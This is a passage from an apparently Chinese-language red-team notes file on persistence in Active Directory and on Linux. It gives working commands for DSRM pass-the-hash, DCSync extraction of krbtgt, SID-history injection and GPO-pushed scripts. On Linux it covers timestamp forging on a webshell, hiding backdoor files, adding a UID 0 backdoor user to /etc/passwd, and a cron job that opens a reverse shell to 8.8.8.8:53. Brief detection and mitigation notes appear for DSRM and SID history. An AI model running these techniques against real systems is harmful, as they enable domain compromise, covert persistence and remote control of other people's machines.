set DSRM password
SYNC FROM DOMAIN ACCOUNT krbtgt
Q
```
修改注册表允许 DSRM 账户远程访问
修改注册表 hkey_local_machineSystemCurrentControlSetControlLsa 路径下的 DSRMAdminLogonBehavior 的值为2。
系统默认不存在 DSRMAdminLogonBehavior，需手动添加。
此时可用 pth 登录
```
Mimikatz "privilege::debug" "sekurlsa::pth /domain: /user:Administrator /ntlm:" exit
```
由于可以为 DSRM 帐户 PTH，因此可以使用 Mimikatz DCSync 利用此访问权限为任何域帐户提取密码数据。我们可以针对特定的域控制器，并使用 DC 的简称来强制执行 NTLM 身份验证。
```
Mimikatz "lsadump :: dcsync /domain:lab.adsecurity.org / dc：adsdc03 / user：krbtgt"
```
DSRM 账户是域控的本地管理员账户，并非域的管理员帐户。所以 DSRM 密码同步之后并不会影响域的管理员帐户。
事件查看器的安全事件中筛选事件 ID 为 4794 的事件日志，来判断域管是否经常进行 DSRM 密码同步操作。
**缓解措施**
- 确保每一台域控制器的 DSRM 账户密码是唯一的并且定期修改此密码。同时，确保注册表 DsrmAdminLogonBehavior 的值不为 2，最好将其直接删除或者设置其值为 1 或 0。
#### SID 历史
**相关文章**
- [Sneaky Active Directory Persistence #14: SID History](https://adsecurity.org/?p=1772)
**描述**
SID 历史记录是支持迁移方案的属性。每个用户帐户都有一个关联的安全标识符（SID），用于跟踪安全主体以及该帐户在连接到资源时所具有的访问权限。SID 历史记录使对另一个帐户的访问可以有效地克隆到另一个帐户。这对于确保用户从一个域移动（迁移）到另一个域时保留访问权限非常有用。由于在创建新帐户时用户的 SID 会更改，因此旧 SID 需要映射到新帐户。将域 A 中的用户迁移到域 B 时，将在域 B 中创建一个新的用户帐户，并将域 A 用户的 SID 添加到域 B 用户帐户的 SID 历史记录属性中。这样可以确保域 B 用户仍然可以访问域 A中的资源。
有趣的是,SID 历史记录对同一域中的 SID 的作用和对同一林中的跨域的 SID 的作用一样，这意味着域 A 中的常规用户帐户可以包含域 A SID，如果域 A 的 SID 是特权账户或组，那么普通用户账户可以获得域 A 的管理权限，而不需要是域 Admins 的成员。
注意：域中的普通用户可以在其 SID 历史记录中包含来自 Active Directory 目录林中的另一个域的 Enterprise Admin SID，从而将用户帐户的访问权限“提升”到目录林中所有域中的有效域管理员。
如果你具有一个没有启用 SID 筛选的林信任关系（也称为隔离），则可以从另一个林中注入一个 SID，并且在进行身份验证并将其用于访问评估时，它将被添加到用户令牌中。
Mimikatz 可以向任何用户账户注入 SID 历史记录（需要域管理员或同等权限）。
在这种情况下，攻击者创建用户帐户“ bobafett”，并将域的默认管理员帐户“ ADSAdministrator”（RID 500）添加到帐户的 SID 历史记录属性。
```
mimikatz "privilege::debug" "misc::addsid bobafett ADSAdministrator"
```
> 注 : mimikatz 在 2016年5月6日移除了 misc::addsid,新增 sid:: module,可使用 sid::add 代替
当 bobafett 账户登录时，所有与该账户相关联的 SIDs 都会被添加到用户的令牌中，用户的令牌用于确定资源的访问权限。与账户关联的 SID 是用户的 SID、用户所在的组 SID（包括这些组的成员）以及 SID 历史记录中包含的 SID。
使用 PowerShell Active Directory cmdlet "Get-ADUser"，我们可以看到没有分配给 bobafett 账户的组成员资格，尽管它在 SIDHistory（ADSAdministrator账户）中确实有一个 SID
```powershell
Import-Module ActiveDirectory
get-aduser bobafett -properties sidhistory,memberof
```
当 bobafett 登录时，会评估与该账户相关的 SID，并根据这些 SID 确定访问权限。由于 bobafett 帐户与 ADSAdmnistrator 帐户（RID 500）相关联，因此 bobafett 帐户拥有 ADSAdministrator 帐户的所有访问权限，包括域管理权限。
**检测手段**
检测 SID 历史记录账户升级的最好方法是枚举出所有在 SID 历史属性中拥有数据的用户，并标记出包含同一域*中的SID的用户。如果用户没有被迁移，可以简单地搜索所有在 SIDHistory 属性中包含数据的用户。
PowerShell AD Cmdlet "Get-ADUser "对于检测 "同域SID历史记录 "最有用。
```powershell
Import-Module ActiveDirectory
[string]$DomainSID = ( (Get-ADDomain).DomainSID.Value )
Get-ADUser -Filter  "SIDHistory -Like '*'" -Properties SIDHistory | `
Where { $_.SIDHistory -Like "$DomainSID-*" }
```
注意，用户的 SIDHistory 中的 SID 以 "500 "结尾，该用户的 SID 是默认的域管理员账户，默认情况下是 Administrators、Domain Admins、Schema Admins 和 Enterprise Admins 的成员。
#### AdminSDHolder ＆ SDProp
**相关文章**
- [Sneaky Active Directory Persistence #15: Leverage AdminSDHolder & SDProp to (Re)Gain Domain Admin Rights](https://adsecurity.org/?p=1906)
---
#### 组策略
**相关文章**
- [BadGPO：组策略对象在持久化及横向渗透中的应用 ](https://www.anquanke.com/post/id/86531)
- [Sneaky Active Directory Persistence #17: Group Policy](https://adsecurity.org/?p=2716)
- [浅析域渗透中的组策略利用](https://xz.aliyun.com/t/7784)
**组策略概述**
组策略使管理员能够管理 Active Directory 中的计算机和用户。组策略保存为组策略对象（GPO）
攻击者可以滥用 GPO，通过欺诈方式进一步自动化地传播恶意软件、实现持久化驻留目的,恶意软件可以利用 GPO 穿越 IDS/IPS 等防火墙，最终访问到域内所有的系统。
GPO 的另一优点就是攻击过程期间并不需要目标系统在线，一旦离线状态下的目标系统重新登录到域中，恶意的 GPO 载荷就会被投递到目标系统。
组策略可以包括安全选项，注册表项，软件安装以及用于启动和关闭的脚本，并且域成员默认情况下每 90 分钟刷新一次组策略设置（对于域控制器为 5 分钟）。 这意味着组策略在目标计算机上强制执行配置的设置。
在大多数 Active Directory 实现中，在域上至少配置了一个 GPO，定义了授权密码、Kerberos 和全域策略；至少有一个为域控制器 OU 配置的 GPO；至少有一个为服务器和工作站 OU 配置的 GPO。这些 GPO 定义了特定于环境的安全设置，并通常配置管理组，包括启动/关闭脚本等。GPO 可以被配置为在每个级别上设置组织定义的安全要求，并可用于安装软件和设置文件和注册表权限。
GPO 仅适用于用户和计算机，并且可以按组进行过滤，或者可以使用“首选项”组件进行更具体的定位。 “No Override”选项可确保即使更接近资源的 GPO 设置相互矛盾，也可以应用组策略中的设置。
SYSVOL 是所有经过身份验证的用户具有读取权限的 Active Directory 中的域范围共享。SYSVOL 包含登录脚本，组策略数据以及其他域控制器中需要使用的全域数据。
SYSVOL 共享将自动同步并在所有域控制器之间共享。
组策略也相当于远控,可以配置脚本让域内的每一台电脑都种上马批量执行一遍。
- 计划任务案例
    **修改密码**
    changepass.vbs
    ```
    strComputer = "."
    Set objUser = GetObject("WinNT://" & strComputer & "/Administrator, user")
    objUser.SetPassword "Zaq1xsw2"
    objUser.SetInfo
    ```
    这个脚本的作用是修改本地管理员账户的密码为 Zaq1xsw2
    在域策略的 GPO 下面下发这个脚本
    在域内主机上面登录域普通用户,强制刷新组策略 `gpupdate /force`,查看 vbs 脚本
    ---
    **按照时间定时的收集信息**
    导入 powershell 中管理 GPO 的模块,创建一个作用整个域的 GPO
    ```
    Import-Module GroupPolicy -verbose
    new-gpo -name TestGPO | new-gplink -Target "dc=test1,dc=local"
    ```
    执行脚本添加计划任务
    ```
    New-GPOImmediateTask -TaskName Debugging -GPODisplayName TestGPO -SysPath '\\dc\sysvol\test1.local' -CommandArguments '-c "123 | Out-File C:\test\debug.txt"'
    ```
    强制更新组策略，或者默认等待90分钟组策略强制更新
    ```
    Invoke-GPUpdate -Computer "TEST\COMPUTER-01"
    ```
    清理痕迹
    ```
    Remove-GPO -Name TestGPO
    ```
---
#### Hook PasswordChangeNotify
**相关文章**
- [域渗透——Hook PasswordChangeNotify](http://drops.xmd5.com/static/drops/tips-13079.html)
- [维持域管权限的一些简单办法[Hook PasswordChangeNotify]](https://klionsec.github.io/2016/08/16/Hook-PasswordChangeNotify/)
---
#### DCShadow
**相关文章**
- [DCShadow：一种新型AD攻击技术](https://www.anquanke.com/post/id/96704)
- [基于AD Event日志识别DCShadow攻击](https://mp.weixin.qq.com/s/2voI9texx6wiyaakXoNJnA)
- [域渗透：DCShadow攻击与利用](https://www.anquanke.com/post/id/146551)
---
## linux
### 启动项
需要开机启动自己的脚本时，只需要将可执行脚本丢在 `/etc/init.d` 目录下，然后在 `/etc/rc.d/rc*.d` 中建立软链接即可
```
ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh
```
此处 sshd 是具体服务的脚本文件，S100ssh 是其软链接，S 开头代表加载时自启动；如果是 K 开头的脚本文件，代表运行级别加载时需要关闭的。
---
### 命令后台运行
当用户注销(logout)或者网络断开时,终端会收 HUP(hangup)信号从而关闭其所有子进程.因此,解决办法有两种途径:要么让进程忽略 HUP 信号,要么让进程运行在新的会话里从而成为不属于此终端的子进程.
1. 使用 nohup 命令,让提交的命令忽略 hangup 信号.
```
nohup ping www.baidu.com &
```
2. 使用 setsid 命令,让命令在不属于终端的子进程当中执行.
```
setsid ping www.baidu.com &
```
3. 使用 disown 命令,让某个作业忽略 hangup 信号
```
disown -h %1
```
4. 使用 screen 命令 建立断开模式的会话(原理和 setid 一样,只不过直接构造了一个环境)
```bash
screen -S 
```
---
### 权限维持技巧
**Linux/Unix 修改文件时间戳**
直接将时间戳修改成某年某月某日.如下 2014 年 01 月 02 日.
`touch -t 1401021042.30 webshell.php`
**压缩包运行命令**
```
touch ''$'\n''id;'
touch ''$'\n''ls -la;'
tar -cf runme.tar *
chmod +x runme.tar
./runme.tar
```
**ssh + http 端口复用**
- [yrutschle/sslh](https://github.com/yrutschle/sslh)
**避免记录登录日志**
```
ssh -T user@host /bin/bash -i
```
**藏文件和文件夹**
1. 比如创建一个名字开头带 `.` 的 Webshell 或者文件夹,默认情况下是不会显示出来的,浏览器访问的时候加点访问就行.(查看方法:ls -a)
    ```
    touch .webshell.php    创建名字为 .webshell.php 的文件
    mkdir .backdoor/       创建名字为 .backdoor 的文件夹
    ```
2. dot files
    ```
    touch ...       创建名字为 ... 的文件
    mkdir ...       创建名字为 ... 的文件夹
    ```
**stdin/stdout/stderr 监控**
- [liamg/siphon](https://github.com/liamg/siphon)
---
### 隐藏后门进程
**相关工具**
- [Screetsec/Vegile](https://github.com/Screetsec/Vegile)
- [rexguowork/phantom-attack](https://github.com/rexguowork/phantom-attack) - Phantom attack is a collection of attacks that evade Linux system call monitoring. A user mode program does not need any special privileges or capabilities to reliably evade system call monitoring using Phantom attack by exploiting insecure tracing implementations.
**相关文章**
- [linux常见backdoor及排查技术](https://xz.aliyun.com/t/4090)
- [Linux后门整理合集](https://www.secpulse.com/archives/59674.html)
- [Linux基础软件威胁疑云：从已知到“未知”](https://mp.weixin.qq.com/s/M346b8Kz_3r-yoDnBLuV8g)
**添加 root 权限后门用户**
我们的目标就是在这个文件中追加一条,一个带有密文且 id 为 0 的账号.
密码加密使用下面的命令 `perl -e 'print crypt("password", "AA"). "\n"'`
所以我们最终想要在 passwd 文件中的条目是这个样子 `backdoor:AA6tQYSfGxd/A/A:0:0:me:/root:/bin/bash`
执行写入 `echo "backdoor:AA6tQYSfGxd/A:0:0:me:/root:/bin/bash">>/etc/passwd`
**Crond 开机自启后门**
先创建 /etc/xxxx 脚本文件(名字自己改),利用该脚本进行反弹.以下脚本代表全自动反弹到 8.8.8.8 的 53 端口.
```vim
vim /etc/xxxx
    #!/bin/bash
    if netstat -ano|grep -v grep | grep "8.8.8.8">/dev/null
    then
    echo "OK">/dev/null
    else
    /sbin/iptables --policy INPUT ACCEPT
    /sbin/iptables --policy OUTPUT ACCEPT
    bash -i >& /dev/tcp/8.8.8.8/53 0>&1
    fi
chmod +sx /etc/xxxx
```
```vim
vim /etc/crontab
    */1 * * * * root /etc/xxxx
service cron reload #不同发行版重启方式不一样
service cron start
```
然后在 8.8.8.8 的服务器上使用 NC 接收 Shell 即可.